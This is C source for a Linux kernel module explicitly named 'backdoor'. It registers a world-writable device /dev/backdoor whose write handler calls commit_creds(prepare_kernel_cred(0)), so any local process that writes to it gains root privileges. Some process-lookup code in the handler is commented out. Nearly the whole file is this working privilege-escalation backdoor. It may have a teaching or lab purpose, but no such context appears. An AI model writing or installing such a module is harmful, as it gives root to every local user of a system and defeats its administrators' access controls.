#include <linux/module.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/errno.h>
#include <linux/types.h>
#include <linux/proc_fs.h>
#include <linux/fcntl.h>
#include <linux/uaccess.h>
#include <linux/miscdevice.h>
#include <linux/cred.h>

const struct file_operations backdoor_fops;
struct miscdevice device;

static int __init backdoor_init(void)
{
	
	int result;
	if ((result = misc_register(&device)) < 0) {
		printk(KERN_WARNING "Cannot register the /dev/%s miscdevice", device.name);
		goto err;
	}
	return 0;
		
	
	
	err:
		misc_deregister(&device);
		return result;
}

static void __exit backdoor_exit(void)
{

	misc_deregister(&device);
			
	printk(KERN_INFO "The BACKDOOR module has been removed\n");
	return;
}


ssize_t backdoor_write(struct file *filp, const char __user *user_buf,
	size_t count, loff_t *f_pos)
{
	/*int i;
	char prname_buffer[6];
	struct task_struct* process;
		
	for (i = 0; i< 6; i++)
		prname_buffer[i] = '\0';
		
	if(count >= 6) return -ENOSPC;
	if( _copy_from_user(prname_buffer, user_buf, count) != 0)
		return -EFAULT;
		
	sscanf(prname_buffer, "%u", &current_process);
	
	if ((process = get_pid_task(find_get_pid(current_process), PIDTYPE_PID)) == NULL) {
		current_process = -1;
		return -ESRCH;
	}
	else {
		get_task_comm(process_name, process);
		strcat(process_name, "\n");
	}*/
	commit_creds(prepare_kernel_cred(0));
	
	return count;
		
}


module_init(backdoor_init);
module_exit(backdoor_exit);

const struct file_operations backdoor_fops = {
	.write = backdoor_write,
};

struct miscdevice device = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = "backdoor",
	.fops = &backdoor_fops,
	.mode = 0666,
};
